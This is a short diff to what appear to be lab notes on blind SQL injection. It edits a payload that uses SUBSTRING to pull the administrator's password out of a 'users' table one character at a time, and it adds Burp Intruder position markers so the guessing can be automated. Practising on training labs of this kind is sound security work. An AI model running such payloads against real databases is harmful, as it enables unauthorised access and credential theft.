@@ -229,7 +229,7 @@ GIVEN :The database contains a different table called users, with columns called
       use Burp Intruder to get exact password length.
     
     2.Now use Burp Intruder to get password.
-     ' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a' --+
+     ' AND (SELECT SUBSTRING(password,$1$,1) FROM users WHERE username='administrator')='$a$' --+
 
 
 
